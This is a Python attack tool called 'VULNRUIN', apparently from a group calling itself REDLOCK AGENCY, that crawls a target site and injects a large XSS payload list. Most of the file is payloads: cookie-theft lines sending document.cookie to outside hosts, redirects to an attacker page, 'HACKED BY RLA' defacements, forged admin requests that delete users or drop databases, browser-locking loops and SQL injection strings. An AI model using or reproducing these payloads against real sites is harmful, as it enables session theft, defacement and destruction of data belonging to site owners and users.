import requests
import base64
import urllib.parse
import csv
import json
import random
from bs4 import BeautifulSoup
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from colorama import Fore, Style, init
from tqdm import tqdm
from fake_useragent import UserAgent

# Initialize Colorama
init(autoreset=True)
ua = UserAgent()

print(f"{Fore.RED}-{Fore.RESET}" * 75 + "\n")
print(f""" {Fore.MAGENTA}[{Fore.RED}:{Fore.GREEN}ＶＵＬＮＲＵＩＮ{Fore.MAGENTA}]    {Fore.RESET}(っ◔◡◔)っ ♥ VULNRUIN ♥   {Fore.MAGENTA} [{Fore.RED}:{Fore.GREEN}ＶＵＬＮＲＵＩＮ{Fore.MAGENTA}]{Fore.RESET}
    {Fore.RESET}HUNT FOR {Fore.BLUE}XSS, REDIRECT & DEFACE VULNS {Fore.RESET}ON A URL OR URLS IN A FILE {Fore.MAGENTA}...{Fore.RESET}
  {Fore.MAGENTA}[ {Fore.GREEN}ᴠᴜʟɴʀᴜɪɴ {Fore.MAGENTA}] {Fore.RESET}WILL TRY TO EXPLOIT THE VULNS IT FINDS{Fore.MAGENTA}...{Fore.RESET}
      {Fore.MAGENTA}---  {Fore.RED}USE AT YOUR OWN RISK{Fore.MAGENTA}!{Fore.RESET} REDLOCK AGENCY""")

# Define payloads
payloads = [
    "<script>alert('XSS')</script>",
    "<img src='x' onerror='alert(1)'>",
    "<a href='javascript:alert(1)'>Click me</a>",
    "<script>eval('alert(1)')</script>",
    "<script>document.location='https://turquoise-jackquelin-59.tiiny.site/'</script>",
    "<svg/onload=alert(1)>",
    "<script>window.location='https://turquoise-jackquelin-59.tiiny.site/'</script>",
    "<input type='text' value='<script>alert(1)</script>' />",
    "<script>document.body.innerHTML = '<img src=x onerror=alert(1)>';</script>",
    "<script>setTimeout(() => { alert(1) }, 1);</script>",
    "<body onload=alert(1)>",
    "<script>document.body.innerHTML = \"<img src='https://static.vecteezy.com/system/resources/previews/015/286/164/non_2x/abstract-word-signal-or-are-warned-that-it-has-been-hacked-by-viruses-malware-or-hackers-on-a-red-digital-background-vector.jpg' style='width:100%; height:100%'>\";</script>",
    "<style>body { background: url('https://static.vecteezy.com/system/resources/previews/015/286/164/non_2x/abstract-word-signal-or-are-warned-that-it-has-been-hacked-by-viruses-malware-or-hackers-on-a-red-digital-background-vector.jpg') no-repeat center center fixed; background-size: cover; }</style>",
    "<script>setInterval(() => { document.body.innerHTML = \"<img src='https://i.ytimg.com/vi/oVo1NNc0i_g/sddefault.jpg' style='width:100%; height:100%'>\"; }, 1000);</script>",
    "<img src='x' onerror=\"https://turquoise-jackquelin-59.tiiny.site/'\">",
    "<a href=\"javascript:window.location='https://turquoise-jackquelin-59.tiiny.site/'\"> <img src=\"https://turquoise-jackquelin-59.tiiny.site/\"></a>",
    "<div style='position:fixed; top:0; left:0; width:100%; height:100%; background:url(\"https://media.discordapp.net/attachments/1331669062392217630/1337139101706490018/New_Project_72.png?ex=67b62d54&is=67b4dbd4&hm=44d34f145ee969b0207f4b6d40e4037c7e71d87836941fe5a21b9a8203ec4b29&=&format=webp&quality=lossless&width=548&height=286\");'></div>",
    "<script>document.body.innerHTML = \"<h1 style='color:red;'>HACKED</h1><img src='https://i.ytimg.com/vi/oVo1NNc0i_g/sddefault.jpg'>\";</script>",
    "<script>document.write('<iframe src=\"https://i.ytimg.com/vi/oVo1NNc0i_g/sddefault.jpg\" width=100% height=100%></iframe>');</script>",
    "<script>localStorage.setItem('xss', '<img src=x onerror=alert(1)>');</script>",
    "<script>document.cookie='XSS=alert(1)';</script>",
    "<script>fetch('https://www.yyyyyyy.info/log?cookie='+document.cookie)</script>",
    "<iframe src='javascript:alert(1)'></iframe>",
    "<svg><script>alert(1)</script></svg>",
    "<div contenteditable onfocus=alert(1)>XSS</div>",
    "<marquee onstart=alert(1)>XSS</marquee>",
    "<object data='javascript:alert(1)'></object>",
    "<embed src='javascript:alert(1)'>",
    "javascript://%0Aalert(1)",
    "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",
    "<scr<script>ipt>alert(1)</scr<script>ipt>",
    "<script src=data:text/javascript,alert(1)></script>",
    "1'><script>alert(1)</script>",
    "<img src=x onerror=setTimeout('alert(1)',500)>",
    "<img src=x onerror='fetch(\"https://www.yyyyyyy.info/log?cookie=\"+document.cookie)'>",
    "<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>",
    "jaVasCript:/*-/*`/*'/*\"/**/(/* */oNcliCk=alert(1) )",
    "<details open ontoggle=alert(1)><summary>Click me</summary></details>",
    "<input onfocus=alert(1) autofocus>",
    "<script>document.body.innerHTML='HACKED BY XSS!';</script>",
    "<script>while(1){alert('Site locked!');}</script>",
    "<script>document.body.style.display='none';</script>",
    "<script>setInterval(() => { document.body.innerHTML='This site is now under control'; }, 1000);</script>",
    "<script>document.body.contentEditable='true';</script>",
    "<script>fetch('https://www.yyyyyyy.info/steal?data='+document.cookie);</script>",
    "<script>new Image().src='https://www.yyyyyyy.info/log?creds='+btoa(document.body.innerHTML);</script>",
    "<script>navigator.sendBeacon('https://www.yyyyyyy.info/log', document.cookie);</script>",
    "<script>document.body.innerHTML = '<h1 style=\"color:red;\">HACKED BY REDLOCK AGENCY</h1>';</script>",
    "<script>document.body.innerHTML = '<h2>Attention: RLA CLAN - This site has been compromised BY REDLOCK AGENCY</h2>';</script>",
    "<script>document.body.innerHTML = '<p style=\"font-size:30px;\">Warning: Unauthorized Access Detected! HACKED BY RLA</p>';</script>",
    "<script>document.body.innerHTML = '<p>Hacked! Message from the attacker: REDLOCK AGENCY is in control now.</p>';</script>",
    "<script>document.body.innerHTML = '<h1>This site is under attack by REDLOCK AGENCY, please contact support!</h1>';</script>",
    "<script>document.body.innerHTML = '<div style=\"background-color:black;color:white;font-size:24px;padding:20px;\">This website has been hacked by RLA!</div>';</script>",
    "<script>document.body.innerHTML = '<h1 style=\"color:blue;\">REDLOCK AGENCY ... Website successfully compromised!</h1>';</script>",
    "<script>console.log('Hacked by XYZ');</script>",
    "<script>alert('Hacked by XYZ');</script>",
    "<script>setTimeout(() => { alert('This website has been compromised by REDLOCK AGENCY | RLA'); }, 5000);</script>",
    "<script>document.body.innerHTML = '<div style=\"font-size: 28px; color: purple;\">Site Defaced by RLA CLAN!</div>';</script>"
    "<iframe src='data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=='></iframe>",
    "<meta http-equiv='refresh' content='0;url=https://turquoise-jackquelin-59.tiiny.site/'>",
    "<style>@import url('javascript:alert(1)');</style>",
    "<div onmousemove='alert(\"XSS\")'>HACKED BY RLA</div>",
    "<svg><a xlink:href='javascript:alert(1)'>HACKED BY RLA</a></svg>",
    "<object type='text/html' data='javascript:alert(1)'></object>",
    "<script>Function('alert(1)')()</script>",
    "<script>window['al'+'ert'](1)</script>",
    "<svg/onload=confirm(1)>",
    "<img src='invalid.jpg' onerror='this.onerror=null;alert(1)'>",
    "<form onsubmit='alert(1)'><input type='submit'></form>",
    "<input type='text' onblur='alert(1)' value='XSS'>",
    "<textarea onfocus='alert(1)'>XSS DEFACE BY RLA</textarea>",
    "<div style='width:expression(alert(1));'>XSS HACKING BY REDLOCK AGENCY</div>",
    "<script>setInterval(function(){alert('XSS HACK BY RLA')}, 2000);</script>",
    "<object data='data:text/html,<script>alert(1)</script>'></object>",
    "<embed src='data:text/html,<script>alert(1)</script>'></embed>",
    "<link rel='stylesheet' href='data:text/css,body{background:red;}' onerror='alert(1)'>",
    "<video><source onerror='alert(1)' src='nonexistent.mp4'></video>",
    "<input type='image' src='invalid' onerror='alert(1)'>",
    "<?php echo \"<script>alert('XSS HACK BY RLA');</script>\"; ?>",
    "<?php echo \"<img src='x' onerror='alert(1)'>\"; ?>",
    "<?php echo \"<a href='javascript:alert(1)'>DEFACED BY RLA</a>\"; ?>",
    "<?php echo \"<script>eval('alert(1)');</script>\"; ?>",
    "<?php echo \"<script>document.location='https://turquoise-jackquelin-59.tiiny.site/';</script>\"; ?>",
    "<?php echo \"<svg onload='alert(1)'>\"; ?>",
    "<?php echo \"<script>window.location='https://turquoise-jackquelin-59.tiiny.site/';</script>\"; ?>",
    "<?php echo \"<input type='text' value='<script>alert(1)</script>' />\"; ?>",
    "<?php echo \"<script>document.body.innerHTML = '<img src=x onerror=alert(1)>';</script>\"; ?>",
    "<?php echo \"<script>setTimeout(() => { alert(1); }, 1);</script>\"; ?>",
    "<?php echo \"<body onload='alert(1)'>\"; ?>",
    "<?php echo \"<script>document.body.style.display='none';</script>\"; ?>",
    "<?php echo \"<script>setInterval(() => { alert('XSS HACKED BY RLA'); }, 1000);</script>\"; ?>",
    "<?php echo \"<iframe src='javascript:alert(1)'></iframe>\"; ?>",
    "<?php echo \"<script>fetch('https://turquoise-jackquelin-59.tiiny.site/steal?cookie='+document.cookie)</script>\"; ?>",
    "<?php echo \"<script>localStorage.setItem('xss','<img src=x onerror=alert(1)>');</script>\"; ?>",
    "<?php echo \"<meta http-equiv='refresh' content='0;url=https://turquoise-jackquelin-59.tiiny.site/'>\"; ?>",
    "<script>alert('HACKED BY REDLOCK AGENCY');</script>",
    "<img src='x' onerror='alert(1)'>",
    "<a href='javascript:alert(1)'>HACKED BY RLA</a>",
    "<script>eval('alert(1)');</script>",
    "<script>document.location='https://turquoise-jackquelin-59.tiiny.site/';</script>",
    "<svg onload='alert(1)'>",
    "<script>window.location='https://turquoise-jackquelin-59.tiiny.site/';</script>",
    "<input type='text' value='<script>alert(1)</script>' />",
    "<script>document.body.innerHTML = '<img src=x onerror=alert(1)>';</script>",
    "<script>setTimeout(() => { alert(1); }, 1);</script>",
    "<body onload='alert(1)'>",
    "<script>document.body.style.display='none';</script>",
    "<script>setInterval(() => { alert('HACKED BY RLA CLAN'); }, 1000);</script>",
    "<iframe src='javascript:alert(1)'></iframe>",
    "<script>localStorage.setItem('xss', '<img src=x onerror=alert(1)>');</script>",
    "<script>document.cookie='XSS=alert(1)';</script>",
    "<script>console.log('Hacked by REDLOCK AGENCY');</script>",
    "<script>setTimeout(() => { alert('This website has been compromised by RLA'); }, 5000);</script>",
    "<script>document.body.innerHTML = '<h1>This site is under attack by RLA!</h1>';</script>",
    "<script>navigator.sendBeacon('https://turquoise-jackquelin-59.tiiny.site/log', document.cookie);</script>",
    "<svg><a xlink:href='javascript:alert(1)'>REDLOCK AGENCY HACKED THIS SITE</a></svg>",
    "<script>document.body.innerHTML = '<h1 style=\"color: red;\">Hacked by XYZ</h1>';</script>",
    "<img src='https://turquoise-jackquelin-59.tiiny.site/' onerror='alert(\"Hacked!\")'>",
    "<style>body { background: url('https://turquoise-jackquelin-59.tiiny.site/'); }</style>",
    "<style>body { display: none; visibility: hidden; }</style>",
    "<script>window.location = 'https://turquoise-jackquelin-59.tiiny.site/';</script>",
    "<div style='width: 100%; height: 100%; background-color: red; text-align: center; font-size: 50px; color: white;'>Site Defaced by XYZ!</div>",
    "<script>alert('This website has been defaced!');</script>",
    "<script>while(true){alert('This site is compromised!');}</script>",
    "<div contenteditable='true' style='background-color: black; color: red;'>Hacked by XYZ</div>",
    "<iframe src='https://static.vecteezy.com/system/resources/previews/015/286/164/non_2x/abstract-word-signal-or-are-warned-that-it-has-been-hacked-by-viruses-malware-or-hackers-on-a-red-digital-background-vector.jpg' width='100%' height='100%'></iframe>",
    "<script>document.body.innerHTML = '<h1 style=\"color: red;\">Defaced by XYZ</h1>';</script>",
    "<meta http-equiv='refresh' content='0;url=https://turquoise-jackquelin-59.tiiny.site/'>",
    "<iframe src='javascript:alert(1)'></iframe>",
    "<script>document.body.innerHTML = '<h1>This site is under attack by RLA!</h1>';</script>",
    "<script>setTimeout(() => { alert('This website has been compromised by RLA'); }, 5000);</script>",
    "<script>localStorage.setItem('xss', '<img src=x onerror=alert(1)>');</script>",
    "<div style='width:expression(alert(1));'>XSS HACKING BY REDLOCK AGENCY</div>",
    "<video><source onerror='alert(1)' src='nonexistent.mp4'></video>",
    "<script>document.body.innerHTML = '<h1>This site is under attack by RLA!</h1>';</script>",
    "<script>navigator.sendBeacon('https://turquoise-jackquelin-59.tiiny.site/', document.cookie);</script>",
    "<img src='x' onerror='alert(1)'>",
    "<a href='javascript:alert(1)'>HACKED BY RLA</a>",
    "<script>eval('alert(1)');</script>",
    "<script>document.location='https://turquoise-jackquelin-59.tiiny.site/';</script>",
    "<svg onload='alert(1)'>",
    "<script>window.location='https://turquoise-jackquelin-59.tiiny.site/';</script>",
    "<input type='text' value='<script>alert(1)</script>' />",
    "<script>document.body.innerHTML = '<img src=x onerror=alert(1)>';</script>",
    "<script>setTimeout(() => { alert(1); }, 1);</script>",
    "<body onload='alert(1)'>",
    "<script>document.body.style.display='none';</script>",
    "<script>setInterval(() => { alert('HACKED BY RLA CLAN'); }, 1000);</script>",
    "<iframe src='javascript:alert(1)'></iframe>",
    "<script>fetch('https://turquoise-jackquelin-59.tiiny.site/steal?cookie='+document.cookie)</script>",
    "<script>localStorage.setItem('xss', '<img src=x onerror=alert(1)>');</script>",
    "<script>document.cookie='XSS=alert(1)';</script>",
    "<script>console.log('Hacked by REDLOCK AGENCY');</script>",
    "<script>setTimeout(() => { alert('This website has been compromised by RLA'); }, 5000);</script>",
    "<script>document.body.innerHTML = '<h1>This site is under attack by RLA!</h1>';</script>",
    "<script>navigator.sendBeacon('https://turquoise-jackquelin-59.tiiny.site/', document.cookie);</script>",
    "<svg><a xlink:href='javascript:alert(1)'>REDLOCK AGENCY HACKED THIS SITE</a></svg>",
    "<script>window ;</script>",
    "<script>document.location='https://turquoise-jackquelin-59.tiiny.site/steal?c='+document.cookie</script>",
    "<div onmouseover=alert(1)>Hover Me</div>",
    "<input type='text' onfocus=alert(1)>",
    "<a href=javascript:alert(1)>Click Me</a>",
    "<button onclick=alert(1)>Click Me</button>",
    "<iframe src='javascript:alert(1)'></iframe>",
    "<video><source onerror=alert(1)></video>",
    "<form><button formaction='javascript:alert(1)'>Submit</button></form>",
    "?param=<script>alert(1)</script>",
    "?param=<script>alert(1)</script>&param=safe_value",
    "?param=%3Cscript%3Ealert(1)%3C/script%3E",
    "<ScRipT>alert(1)</ScRipT>",
    "<script>alert(1)</script>", 
    "<s c r i p t>alert(1)</s c r i p t>", 
    "%3Cscript%3Ealert(1)%3C/script%3E", 
    "PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
    "<script>eval('String.fromCharCode(97,108,101,114,116)(1)')</script>", 
    "<script>setTimeout('alert(1)', 100)</script>",
    "<img src='#' srcset='x' onerror='eval(atob(\"YWxlcnQoMSk=\"))'>",
    "<script>fetch('/admin/delete_user?id=123', {method: 'POST'});</script>",
    "<script>fetch('/admin/delete_all_users', {method: 'POST', credentials: 'include'});</script>",
    "<form action='https://target.com/admin/delete_user' method='POST'><input type='hidden' name='user_id' value='1'><input type='submit'></form>",
    "<script>fetch('/admin/drop_database', {method: 'POST'});</script>",
    "<script>var xhr = new XMLHttpRequest(); xhr.open('POST', '/api/delete_all', true); xhr.withCredentials = true; xhr.send();</script>",
    "<script>fetch('/api/change_role?user=me&role=admin');</script>",
    "<img src='https://target.com/api/set_password?user=admin&pass=evil123'>",
    "<script>document.location='https://turquoise-jackquelin-59.tiiny.site/steal?c='+document.cookie</script>",
    "<script>fetch('/logout_all', {method: 'POST'});</script>",
    "<script>document.cookie='session=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;';</script>",
    "<script>new Image().src='https://turquoise-jackquelin-59.tiiny.site/log?c='+document.cookie;</script>",
    "<script>document.body.innerHTML='HACKED BY RLA';</script>",
    "<script>while(true){console.log('DDOS BY RLA');}</script>",
    "'\"><svg onload=alert(1)>",
    "' OR '1'='1' --",
    "\" OR \"1\"=\"1\" --",
    "1' AND 1=1 --",
    "1' UNION SELECT 1,2,3,4,5,6,7,8,9,10 --",
    "<script>top.location='https://turquoise-jackquelin-59.tiiny.site/phish?token='+document.cookie;</script>",
    "<script>document.write('<iframe src=\"https://turquoise-jackquelin-59.tiiny.site/\"></iframe>');</script>"
]

# Encoding techniques
def encode_payload(payload):
    return {
        "hex": payload.encode().hex(),
        "base64": base64.b64encode(payload.encode()).decode(),
        "url": urllib.parse.quote(payload)
    }

# Scan a URL for XSS vulnerabilities
def scan_xss(url):
    vulnerabilities = []
    headers = {"User-Agent": ua.random}
    for payload in tqdm(payloads, desc="Scanning XSS"):
        encodings = encode_payload(payload)
        test_payloads = [payload, encodings["hex"], encodings["base64"], encodings["url"]]
        
        for test_payload in test_payloads:
            injected_url = f"{url}?q={test_payload}"
            response = requests.get(injected_url, headers=headers)
            
            if test_payload in response.text:
                vulnerabilities.append((url, test_payload, "Reflected XSS"))
                print(f"{Fore.RED}-{Fore.RESET}" * 75 + "\n")
                print(f" {Fore.MAGENTA}[{Fore.GREEN}+{Fore.MAGENTA}] {Fore.WHITE}XSS Detected{Fore.RED}:{Fore.RESET} {injected_url}")
    return vulnerabilities

# Test for DOM-based XSS using Selenium
def test_dom_xss(url, payload):
    options = Options()
    options.add_argument("--headless")
    options.add_argument(f"--user-agent={ua.random}")
    driver = webdriver.Chrome(options=options)
    
    try:
        driver.get(url)
        escaped_payload = json.dumps(payload)
        driver.execute_script(f"document.write({escaped_payload})")
        
        if "alert(1)" in driver.page_source:
            print(f"{Fore.RED}-{Fore.RESET}" * 75 + "\n")
            print(f" {Fore.MAGENTA}[{Fore.GREEN}+{Fore.MAGENTA}] {Fore.YELLOW}Possible DOM XSS{Fore.RED}:{Fore.RESET} {url}")
    finally:
        driver.quit()

# Crawl a website for links
def crawl_website(url):
    headers = {"User-Agent": ua.random}
    response = requests.get(url, headers=headers)
    soup = BeautifulSoup(response.text, "html.parser")
    links = {urllib.parse.urljoin(url, a["href"]) for a in soup.find_all("a", href=True)}
    return links

# Save results to a CSV file
def save_report(vulns):
    with open("xss_report.csv", "w", newline="") as file:
        writer = csv.writer(file)
        writer.writerow(["URL", "Payload", "Vulnerability Type"])
        for vuln in vulns:
            writer.writerow(vuln)

# Main function
def main():
    print(f"{Fore.RED}-{Fore.RESET}" * 75 + "\n")
    target_url = input(f"{Fore.MAGENTA}[{Fore.CYAN}+{Fore.MAGENTA}] {Fore.RED}- {Fore.RESET}ENTER TARGET URL{Fore.RED}:{Fore.RESET} ")
    all_vulnerabilities = []
    
    # Scan main URL
    all_vulnerabilities.extend(scan_xss(target_url))
    
    # Crawl and scan discovered pages
    for link in tqdm(crawl_website(target_url), desc="Crawling website"):
        all_vulnerabilities.extend(scan_xss(link))
    
    # Test for DOM-based XSS
    for payload in tqdm(payloads, desc="Testing DOM XSS"):
        test_dom_xss(target_url, payload)
    
    # Save results
    save_report(all_vulnerabilities)
    print("[+] Scan complete. Results saved to xss_report.csv")

if __name__ == "__main__":
    main()
